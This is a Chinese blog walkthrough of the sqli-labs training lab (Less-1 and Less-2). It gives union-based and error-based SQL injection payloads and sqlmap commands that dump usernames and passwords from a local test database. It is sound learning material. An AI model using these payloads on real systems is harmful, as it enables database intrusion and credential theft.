@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="逆时针向" />
+
+
+
+<meta name="description" content="Less 1-10[TOC] Less-1 基于错误的GET单引号字符型注入  0x01   手动union联合查询注入输入单引号,页面报错,输入两个单引号,回显正常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs-通关writeup 1-10">
+<meta property="og:url" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/index.html">
+<meta property="og:site_name" content="逆时针向">
+<meta property="og:description" content="Less 1-10[TOC] Less-1 基于错误的GET单引号字符型注入  0x01   手动union联合查询注入输入单引号,页面报错,输入两个单引号,回显正常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/5c1fca037e4ee29f1a35bc4e952400f0.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/376188e291a243816d79d46761c25b78.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/696b48641911453cc8d872f64e6a9ec3.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/37dbe05b1f54d98d1bf3ac3f695db828.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a1b9075b9af9540b5f83d4dccd102933.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/937a93b6b58e01c6ac16187d4a79e531.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/423457d58a014c931208225a4244cd91.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7f1a6a036a1143caaf3213f2d46e177a.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/be72ef63246406cd5ec58196025f6a83.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/df1ccea5d4bdc42030adebe0c51b4302.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a8f8ee01bf689d443aaa3ab5aaadb416.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/e38ba29bfa94c271525effee2dab5755.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/1b65a585c02b0634762de91afe874733.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a60c9c126fb82c86aab6cf90d85139f1.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/866e2dd210f204568c3ceb7296fad2be.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/88aebca0e22b5ad28a471ae03d743868.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/68087d05751b9b1b105cc9bca6ad0b59.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/83d3ed9f3698286cdc35c4b122bb1128.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/1fbff551c5ef5dc9fa1636a159c6d14a.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/c64639a27c09fc377b4b3caeac20a63a.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/932d4110a0012e9944f9c3d02584b73c.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/64b53eec12147f7eab73b6f5ac34024f.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a2ff7113556243987dbf535d043e0232.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/384183fbda4fc0974b2423a51e3a25bc.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6aaf80ba473e46fda03a21d99d9e6343.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/639993b1c732d9cb080e613c44fa7ff8.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/cf47889423b7b0facf1b543f26c2a522.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a8736beaf2a9ffbf955219ea4913d22d.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/9143f12bd0a3dbea73f85d0f5c9d2392.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/228c5c6b45efd478ba14ae405ef1bb8a.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/231a6b672c5c7674c9db03ec9c778ffb.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7eb10475f244babc1b7997ac93f5e0d0.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6885541a946fc4e22ceed657242727e5.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/619827c2ce7134c99eb0515c1d073401.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/e481a4f8026939c2046048d4c4483775.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/5739f3f49a192e9b6d7239a0e99669c3.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7f8c95ba46199547ddc104501346400c.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/12f084069fe6e0c7bd893f060281a505.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/aafb93a7aab5848fadcb9cfa316fc1ba.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/9830cc7dc7529b65cd2982ed02d9b881.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/33b43febf80f09cda6292c314c10b131.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/aef8aa7bf5b7e7b89aef0f9ca2ecd16a.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/b582aa65aa9af20056d04ff7bfb18d98.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/129c82cf80f6d719494deeebf3792cfa.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/adbafna234fgf719494deeebf3792cfa.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/24817486e6b08f1034a7d6fd194b7475.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/ba51718817d3e669a7ce647613d36386.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6376170d3ba33250f0d759dbad87e39d.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/73a1d380f295876ef1fe557930979a08.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/045947d9e2adb48e2c7cbf8aa436dfbc.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6b50cf801c89ffdc97c6343517240b1c.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/2a5c06f7c032d6bdf99db3ee1829b4ae.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/c3de357635e9761fd78cfac793396a11.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/d25e5a24f678d0d4722c2007a86a00a2.png">
+<meta property="og:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7674afc406390c2427bbe3bcac18ec9e.png">
+<meta property="article:published_time" content="2020-08-12T02:05:45.000Z">
+<meta property="article:modified_time" content="2020-08-25T16:09:47.403Z">
+<meta property="article:author" content="逆时针向">
+<meta property="article:tag" content="Sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lynx1.cn/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/5c1fca037e4ee29f1a35bc4e952400f0.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="逆时针向" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>sqli-labs-通关writeup 1-10 | 逆时针向</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">逆时针向</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">路虽远,行则必达; 事虽小,做则必成!</p>
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">随笔</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" rel="noopener" href="https://github.com/Lynx-1" title="GitHub"></a>
+                            
+                                <a class="fa Google" target="_blank" rel="noopener" href="https://www.google.com/" title="Google"></a>
+                            
+                                <a class="fa Twitter" target="_blank" rel="noopener" href="https://twitter.com/Lynx9527" title="Twitter"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/Lynx-1">GitHub</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">逆时针向</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">逆时针向</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">路虽远,行则必达; 事虽小,做则必成!</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">随笔</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Lynx-1" title="GitHub"></a>
+                            
+                                <a class="fa Google" target="_blank" href="https://www.google.com/" title="Google"></a>
+                            
+                                <a class="fa Twitter" target="_blank" href="https://twitter.com/Lynx9527" title="Twitter"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-sqli-labs-通关writeup-1-10" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/" class="article-date">
+      <time datetime="2020-08-12T02:05:45.000Z" itemprop="datePublished">2020-08-12</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqli-labs-通关writeup 1-10
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sql%E6%B3%A8%E5%85%A5/" rel="tag">Sql注入</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="Less-1-10"><a href="#Less-1-10" class="headerlink" title="Less 1-10"></a>Less 1-10</h1><p>[TOC]</p>
+<h2 id="Less-1-基于错误的GET单引号字符型注入"><a href="#Less-1-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 基于错误的GET单引号字符型注入"></a>Less-1 基于错误的GET单引号字符型注入</h2><hr>
+<ul>
+<li><p><strong>0x01   手动union联合查询注入</strong><br>输入单引号,页面报错,输入两个单引号,回显正常<a id="more"></a>,说明存在字符型sql输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39;  </span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/5c1fca037e4ee29f1a35bc4e952400f0.png" alt="less-1_1"><br>根据报错信息,可以确定传入参数被存到一对单引号之间<br>猜想sql语句大概这样:<br><code>select * from user where id=&#39;1&#39;</code><br>闭合方法: 通过单引号闭合前面的单引号 然后注释掉后面的内容</p>
+</li>
+<li><p>sql中的几种注释</p>
+<ol>
+<li>#  / %23(url编码)</li>
+<li>–空格 / –+</li>
+<li>/* …  */</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li>开工</li>
+</ul>
+<ol>
+<li><p>通过order by查询字段数</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;  order by 3--+</code><br>字段数先取4,报错(说第4列未知)<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/376188e291a243816d79d46761c25b78.png" alt="less-1_2"><br>字段数取3后页正常显示</p>
+</blockquote>
+</li>
+<li><p>测试回显位置</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,3--+</code><br>要执行union后的语句就要让union前的查询语句不正确，取id=-1或0(只要不存在就ok)<br>通过回显可位可知, 2,3字段位置有回显</p>
+</blockquote>
+</li>
+<li><p>爆数据库名<br> 先介绍几个重要函数:<br> database()    # 当前数据库<br> user()          #当前用户<br> version()       #数据库版本信息</p>
+</li>
+</ol>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39; union select 1,database(),3--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/696b48641911453cc8d872f64e6a9ec3.png" alt="less-1_3"><br>    由回显信息可知, 数据库名为 “security” </p>
+</blockquote>
+<ol start="4">
+<li><p>爆表名</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39; union select 1,table_name,3 from information_schema.tables  where table_schema=&#39;security&#39;--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/37dbe05b1f54d98d1bf3ac3f695db828.png" alt="less-1_4"><br>发现只能显示一个表名, 查看源码发现后台 使用 limit 限制回显行数<br>可以通过通过group_concat()函数显示多个字段</p>
+<blockquote>
+<p>group_concat()   #把一个字段的所有行的结果连在一起返回</p>
+</blockquote>
+<p><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a1b9075b9af9540b5f83d4dccd102933.png" alt="less-1_5"></p>
+</blockquote>
+</li>
+<li><p>爆字段名</p>
+<blockquote>
+<p>payload:<code> http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/937a93b6b58e01c6ac16187d4a79e531.png" alt="less-1_6"></p>
+</blockquote>
+</li>
+<li><p>爆内容</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(concat_ws(0x3a,username,password)),3 from security.users--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/423457d58a014c931208225a4244cd91.png" alt="less-1_7"><br>concat_ws函数,已指定字符 [拼接] 指定内容<br>0x3a 表示十六进制的  :  (冒号)</p>
+</blockquote>
+</li>
+</ol>
+<ul>
+<li><strong>0x02   手动报错型注入</strong> <blockquote>
+<p>payload:<br><code>payload1: ?id=1&#39; and 1=1 </code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7f1a6a036a1143caaf3213f2d46e177a.png" alt="less-1_8"><br><code>payload2: ?id=1&#39; and  1=2</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/be72ef63246406cd5ec58196025f6a83.png" alt="less-1_9"><br>证明存在报错注入</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>几种重要的报错注入函数:</strong></p>
+<blockquote>
+<p><code>updatexml() </code>   #MYSQL对XML文档数据进行查询和修改的XPATH函数.<br><code>extractvalue()</code>  #MYSQL对XML文档数据进行查询的XPATH函数.<br><code>floor()  </code>         # MYSQL中用来取整的函数<br><code>concat</code> 把传进去的两个参数组合成一个完整的参数再打印出   0x7e为 ~ 的16进制(避免报错内容不被吃掉(也可用其他符号的16进制))</p>
+</blockquote>
+<p><strong>开始注入:</strong></p>
+<ol>
+<li><p>爆库名 </p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,database()),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/df1ccea5d4bdc42030adebe0c51b4302.png" alt="less-1_10"><br>由图可知, 数据库名与报错信息一起被回显到页面</p>
+</blockquote>
+</li>
+<li><p>爆表名</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select table_name from  information_schema.tables where table_schema=&#39;security&#39;)),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a8f8ee01bf689d443aaa3ab5aaadb416.png" alt="less-1_11"><br>报错提示Subquery returns more than 1 row<br>原因是报错只能依次显示一行, 我们可以使用limit限制回显行数<br>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select table_name from  information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/e38ba29bfa94c271525effee2dab5755.png" alt="less-1_12"><br>通过改变limit a,1 中a的值, 依次爆出security中的表为:<br>emails, referers, uagents, users</p>
+</blockquote>
+</li>
+<li><p>爆字段名</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select column_name from  information_schema.columns where table_name=&#39;users&#39; limit 4,1)),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/1b65a585c02b0634762de91afe874733.png" alt="less-1_13"><br>具体操作同上, 依次爆出字段名为:<br>id, username, password</p>
+</blockquote>
+</li>
+<li><p>爆内容</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select concat_ws(0x3a,id,username,password) from  security.users limit 0,1)),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a60c9c126fb82c86aab6cf90d85139f1.png" alt="less-1_14"></p>
+</blockquote>
+</li>
+</ol>
+<p>0x03 <strong>通过工具sqlmap自动注入</strong>(至少Less-1~Less-10可用该方法测试)</p>
+<ol>
+<li><p>自动扫描漏洞</p>
+<blockquote>
+<p>payload: <code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/866e2dd210f204568c3ceb7296fad2be.png" alt="less-1_15"></p>
+</blockquote>
+</li>
+<li><p>爆数据库名</p>
+<blockquote>
+<p>payload: <code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --dbs</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/88aebca0e22b5ad28a471ae03d743868.png" alt="less-1_16"></p>
+</blockquote>
+</li>
+<li><p>爆库security中的表名</p>
+<blockquote>
+<p>payload: <code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security --tables</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/68087d05751b9b1b105cc9bca6ad0b59.png" alt="less-1_17"></p>
+</blockquote>
+</li>
+<li><p>爆表users中的字段名</p>
+<blockquote>
+<p>payload: <code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users --columns</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/83d3ed9f3698286cdc35c4b122bb1128.png" alt="less-1_18"></p>
+</blockquote>
+</li>
+<li><p>爆内容</p>
+<blockquote>
+<p>payload: <code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users -C id,username,password --dump</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/1fbff551c5ef5dc9fa1636a159c6d14a.png" alt="less-1_19"></p>
+</blockquote>
+</li>
+</ol>
+<p><strong>Game Over~~</strong></p>
+<p>后面内容每道题仅介绍一种方式进行注入测试</p>
+<hr>
+<h2 id="Less-2-基于错误的GET整型注入"><a href="#Less-2-基于错误的GET整型注入" class="headerlink" title="Less-2 基于错误的GET整型注入"></a>Less-2 基于错误的GET整型注入</h2><p>类似于Less-1,甚至还比Less-1要简单—–&gt;&gt;&gt;话不多说,直接开干</p>
+<p>先丢个单引号试试水,发现直接报错<br><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#39;</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/c64639a27c09fc377b4b3caeac20a63a.png" alt="less-2_1"><br>报错内容:<code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>由单引号中内容可猜想sql语句:(整型注入)<br><code>select * from users where id=1;</code><br>或者也可以通过布尔值报错的方式判断是否为整型注入<br>先用and 1=1 试试, and表示并列,只有当and两边均为true时才为真<br><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 and 1=1--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/932d4110a0012e9944f9c3d02584b73c.png" alt="less-2_2"></p>
+<p>发现正常回显, 再用and 1=2 试试<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/64b53eec12147f7eab73b6f5ac34024f.png" alt="less-2_3"></p>
+<p>发现无回显, 说明 and 后面的内容参与后台数据库逻辑运算, 可判断此处存在注入, 而且是整型注入</p>
+<ol>
+<li><p>用order by 爆字段数</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 3 --+</code></p>
+</blockquote>
+</li>
+<li><p>爆数据库名</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39; union select 1,database(),3--+</code><br>也可以以用<br><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3  from information_schema.schemata--+</code><br>爆所有数据库<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a2ff7113556243987dbf535d043e0232.png" alt="less-2_3"></p>
+</blockquote>
+</li>
+<li><p>爆表名(换个库玩玩,爆一下day1中的表)</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name),3  from information_schema.tables  where table_schema=&#39;day1--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/384183fbda4fc0974b2423a51e3a25bc.png" alt="less-2_4"></p>
+</blockquote>
+</li>
+</ol>
+<ol start="4">
+<li><p>爆字段名(flag表中的字段)</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(column_name),3  from information_schema.columns  where table_name=&#39;flag&#39;--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6aaf80ba473e46fda03a21d99d9e6343.png" alt="less-2_5"><br>发现只有一个字段, 字段名也为flag</p>
+</blockquote>
+</li>
+<li><p>爆内容</p>
+<blockquote>
+<p>payload: <code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,flag,3  from day1.flag--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/639993b1c732d9cb080e613c44fa7ff8.png" alt="less-2_6"></p>
+</blockquote>
+</li>
+</ol>
+<p>成功爆出flag, Game Over<br>如果想要爆数据库security, 操作与Less-1类似…<br>Game Over~~</p>
+<hr>
